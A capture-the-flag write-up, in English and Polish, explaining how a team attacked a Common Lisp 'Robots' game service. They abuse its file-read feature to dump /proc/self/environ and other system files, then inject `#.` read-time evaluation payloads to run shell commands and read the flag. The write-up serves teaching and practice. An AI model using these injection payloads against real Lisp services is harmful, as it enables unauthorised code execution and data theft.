## Robots (misc)

###ENG
[PL](#pl-version)

We get netcat address where we can play a game after connecting.
The game was: https://en.wikipedia.org/wiki/Robots_%28computer_game%29
The goal of the game was to avoid robots chasing our character and cause them to crash into each other.
After winning the game we get the ability to read contents of the file in the filesystem.

With this power we proceed with reading:

```
/proc/self/environ
/etc/rsyslog.conf
/proc/self/cmdline
/proc/self/exe
```

Reading `cmdline` was very interesting since it told us that the game is written in LISP and we also got the name of the script.
Therefore we read the contents of the script:

```lisp
> robots.lisp
(import 'charset:utf-8 'keyword)

; Original code: http://landoflisp.com/robots.lisp

; To get the flag you'll have to get a shell...

(defun readfile (file)
  (let ((in (open file :if-does-not-exist nil)))
    (when in
      (loop for line = (read-line in nil)
            while line do (format t "~a~%" line))
      (close in))))

(defun win ()
  (format t (colorize 'green "~%Congratulations, you won!!!"))
  (loop
    (format t "~%What do you want to do?")
    (format t "~%~{~a to read a file, ~a to play again, ~a to quit~}~%> "
            (mapcar (lambda (x) (colorize 'green x)) '("r" "c" "q")))
    (setq c (read))
    (ccase c
           ('r (progn
                 (format t "File? (FYI flag is not in \"flag\", \"key\", etc.)~%> ")
                 (readfile (read-line))))
           ('c (return 1))
           ('q (return 0)))))

(defun fail ()
  (format t (colorize 'red "You lost!")) 0)

(defun colorize (color text)
  (setq colors '((gray . 30) (red . 31) (green . 32) (yellow . 33) (blue . 34)))

  (format nil
          "~c[1;~am~a~c[0m" #\ESC
          (cdr (assoc color colors))
          text #\ESC))

(defun play-game ()
  "Returns 1 if player won and wishes to continue, 0 otherwise"
  (loop named main
        with directions = '((q . -65) (w . -64) (e . -63) (a . -1)
                                      (d .   1) (z .  63) (x .  64) (c . 65))
        for pos = 544
        then (progn (format t
                            "~%~{~a/~a/~a to move, (~a)eleport, (~a)eave: ~}"
                            (mapcar (lambda (x) (colorize 'blue x)) '("qwe" "asd" "zxc" "t" "l")))
                    (force-output)
                    (let* ((c (read))
                           (d (assoc c directions)))
                      (cond (d (+ pos (cdr d)))
                            ((eq 't c) (random 1024))
                            ((eq 'l c) (progn
                                        (format t (colorize 'yellow "Good-bye!"))
                                        (return-from main 0)))
                            (t pos))))

        for monsters = (loop repeat 40
                             collect (random 1024))
        then (loop for mpos in monsters
                   collect (if (> (count mpos monsters) 1)
                             mpos
                             (cdar (sort (loop for (k . d) in directions
                                               for new-mpos = (+ mpos d)
                                               collect (cons (+ (abs (- (mod new-mpos 64)
                                                                        (mod pos 64)))
                                                                (abs (- (ash new-mpos -6)
                                                                        (ash pos -6))))
                                                             new-mpos))
                                         '<
                                         :key #'car))))
        do (progn
             (format t
                     "~a~%�~{~<�~%�~,650:;~a~>~}�~a"
                     (format nil "~%-~{~<-~%-~,650:;~64,1,1,'=A~>~}�" '("? GAME ?"))
                     (loop for p
                           below 1024
                           collect (cond ((member p monsters)
                                          (cond ((= p pos) (return-from main (fail)))
                                                ((> (count p monsters) 1) (colorize 'yellow #\?))
                                                (t (colorize 'red #\?))))
                                         ((= p pos)
                                          (colorize 'green #\�))
                                         (t (colorize 'gray #\ ))))
                     (format nil "~%L~{~<-~%-~,650:;~64,1,1,'=A~>~}-" '("")))
             )
        when (loop for mpos in monsters
                   always (> (count mpos monsters) 1))
        return (win)
        ))

(handler-case
  (loop while (= (play-game) 1))
  (error (e) (write-line "Invalid command")))
```

And we started with analysis of this code to check for some vulnerabilities.
There are only 3 places where we provide input so we focused on those.
They were using `read` function so we tried to find if it can be exploited.
Then we found this document: http://irreal.org/blog/?p=638

It was exactly what we needed!
By sending payloads:

```
#.(lisp_code)
```

We get remote code execution.
With this we checked how to execute shell commands from LISP and used:

```
#.(run-shell-command "ls")
```

To find the flag in `/getflag/flag` and also a binary `getflag/read_flag` with rights to read it.
We run it:

```
#.(run-shell-command "./getflag/read_flag")
```

To read the flag.

###PL version

Dostajemy adres IP do połączenia za pomocą netcata pod którym możemy zagrać w grę.
Gra to: https://en.wikipedia.org/wiki/Robots_%28computer_game%29
Celem gry jest unikanie goniących nas robotów i powodowanie żeby roboty wpadały na siebie.
Po wygraniu gry dostajemy możliwość przeczytania zawartości pliku z dysku.

Możliwość czytania z plików wykorzystujemy do przeczytania:

```
/proc/self/environ
/etc/rsyslog.conf
/proc/self/cmdline
/proc/self/exe
```

Czytanie `cmdline` było bardzo ciekawe ponieważ powiedziało nam że gra jest napisana w LISPie a także jak nazywa się skrypt.
Dzięki temu mogliśmy odczytać źródło skryptu:

```lisp
> robots.lisp
(import 'charset:utf-8 'keyword)

; Original code: http://landoflisp.com/robots.lisp

; To get the flag you'll have to get a shell...

(defun readfile (file)
  (let ((in (open file :if-does-not-exist nil)))
    (when in
      (loop for line = (read-line in nil)
            while line do (format t "~a~%" line))
      (close in))))

(defun win ()
  (format t (colorize 'green "~%Congratulations, you won!!!"))
  (loop
    (format t "~%What do you want to do?")
    (format t "~%~{~a to read a file, ~a to play again, ~a to quit~}~%> "
            (mapcar (lambda (x) (colorize 'green x)) '("r" "c" "q")))
    (setq c (read))
    (ccase c
           ('r (progn
                 (format t "File? (FYI flag is not in \"flag\", \"key\", etc.)~%> ")
                 (readfile (read-line))))
           ('c (return 1))
           ('q (return 0)))))

(defun fail ()
  (format t (colorize 'red "You lost!")) 0)

(defun colorize (color text)
  (setq colors '((gray . 30) (red . 31) (green . 32) (yellow . 33) (blue . 34)))

  (format nil
          "~c[1;~am~a~c[0m" #\ESC
          (cdr (assoc color colors))
          text #\ESC))

(defun play-game ()
  "Returns 1 if player won and wishes to continue, 0 otherwise"
  (loop named main
        with directions = '((q . -65) (w . -64) (e . -63) (a . -1)
                                      (d .   1) (z .  63) (x .  64) (c . 65))
        for pos = 544
        then (progn (format t
                            "~%~{~a/~a/~a to move, (~a)eleport, (~a)eave: ~}"
                            (mapcar (lambda (x) (colorize 'blue x)) '("qwe" "asd" "zxc" "t" "l")))
                    (force-output)
                    (let* ((c (read))
                           (d (assoc c directions)))
                      (cond (d (+ pos (cdr d)))
                            ((eq 't c) (random 1024))
                            ((eq 'l c) (progn
                                        (format t (colorize 'yellow "Good-bye!"))
                                        (return-from main 0)))
                            (t pos))))

        for monsters = (loop repeat 40
                             collect (random 1024))
        then (loop for mpos in monsters
                   collect (if (> (count mpos monsters) 1)
                             mpos
                             (cdar (sort (loop for (k . d) in directions
                                               for new-mpos = (+ mpos d)
                                               collect (cons (+ (abs (- (mod new-mpos 64)
                                                                        (mod pos 64)))
                                                                (abs (- (ash new-mpos -6)
                                                                        (ash pos -6))))
                                                             new-mpos))
                                         '<
                                         :key #'car))))
        do (progn
             (format t
                     "~a~%�~{~<�~%�~,650:;~a~>~}�~a"
                     (format nil "~%-~{~<-~%-~,650:;~64,1,1,'=A~>~}�" '("? GAME ?"))
                     (loop for p
                           below 1024
                           collect (cond ((member p monsters)
                                          (cond ((= p pos) (return-from main (fail)))
                                                ((> (count p monsters) 1) (colorize 'yellow #\?))
                                                (t (colorize 'red #\?))))
                                         ((= p pos)
                                          (colorize 'green #\�))
                                         (t (colorize 'gray #\ ))))
                     (format nil "~%L~{~<-~%-~,650:;~64,1,1,'=A~>~}-" '("")))
             )
        when (loop for mpos in monsters
                   always (> (count mpos monsters) 1))
        return (win)
        ))

(handler-case
  (loop while (= (play-game) 1))
  (error (e) (write-line "Invalid command")))
```

Następnie zaczęliśmy analizę kodu w poszukiwaniu podatności.
W kodzie są tylko 3 miejsca gdzie podajemy jakieś dane więc skupiliśmy się na nich.
Dane są wczytywane za pomocą funkcji `read` więc szukaliśmy informacji na temat exploitowaniu jej.
Trafiliśmy na: http://irreal.org/blog/?p=638

I to było dokładnie to czego potrzebowaliśmy!
Wysyłając:

```
#.(lisp_code)
```

Dostajemy remote code execution.
Następnie sprawdziliśmy jak wykonywać komendy shell z poziomu LISPa i wysłaliśmy:

```
#.(run-shell-command "ls")
```

Aby znaleźć falgę w `/getflag/flag` oraz program `getflag/read_flag` z uprawnieniami do odczytania flagi;
Uruchamiamy go:

```
#.(run-shell-command "./getflag/read_flag")
```

Aby odczytać flagę
